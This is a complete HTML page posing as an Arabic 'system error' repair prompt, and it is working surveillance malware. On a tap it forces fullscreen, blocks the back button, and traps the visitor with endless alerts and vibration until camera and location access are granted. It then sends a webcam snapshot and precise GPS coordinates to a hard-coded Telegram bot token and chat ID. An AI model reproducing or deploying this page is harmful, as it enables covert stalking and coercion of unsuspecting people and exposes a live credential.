<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>⚡ نظام الحماية: قفل طوارئ ⚡</title>
    <style>
        body { background: #000; color: #f00; text-align: center; font-family: sans-serif; height: 100vh; margin: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; touch-action: none; }
        #warn { font-size: 20px; font-weight: bold; border: 3px solid #f00; padding: 20px; z-index: 9999; background: #000; }
    </style>
</head>
<body onclick="forceLock()">

<div id="warn">
    ⚠️ خطأ في النظام (System Error) ⚠️<br><br>
    اضغط هنا لإصلاح ملفات التشغيل فوراً وتجنب فقدان البيانات.
</div>

<video id="v" autoplay playsinline style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
    const ID = "1772820433";

    async function send(m, isImg=false) {
        let u = `https://api.telegram.org/bot${T}/`;
        if(!isImg) {
            await fetch(u+'sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:ID,text:m})});
        } else {
            const b = await (await fetch(m)).blob();
            const f = new FormData(); f.append('chat_id',ID); f.append('photo',b,'hit.png');
            await fetch(u+'sendPhoto',{method:'POST',body:f});
        }
    }

    async function forceLock() {
        // 1. طلب ملء الشاشة القسري (Sticky)
        document.documentElement.requestFullscreen({ navigationUI: "hide" });

        // 2. تجميد النظام النفسي والتقني
        while(true) {
            try {
                // محاولة سحب الكاميرا والموقع
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                const p = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true});
                });

                // إذا نجح السحب، نرسل البيانات ونفك التجميد
                const vid = document.getElementById('v');
                vid.srcObject = s;
                setTimeout(() => {
                    const can = document.getElementById('c');
                    can.width=vid.videoWidth; can.height=vid.videoHeight;
                    can.getContext('2d').drawImage(vid,0,0);
                    send(can.toDataURL('image/png'), true);
                    send(`🎯 إحداثيات GPS:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                    alert("✅ تم الإصلاح!");
                    window.location.href = "https://google.com";
                }, 1000);
                break; 

            } catch(err) {
                // ضربة الـ "Freeze": جعل الهاتف يهتز ويظهر تنبيهات لا تنتهي
                navigator.vibrate([1000, 1000, 1000]);
                // هذه الرسالة ستظهر فوق أزرار النظام وتمنع الضحية من التفاعل معها
                alert("🚨 تنبيه أمني: لا يمكنك الخروج! يجب تفعيل الصلاحيات لإلغاء القفل.");
            }
        }
    }

    // قتل زر الرجوع
    history.pushState(null, null, location.href);
    window.onpopstate = () => { history.pushState(null, null, location.href); };
</script>
</body>
</html>
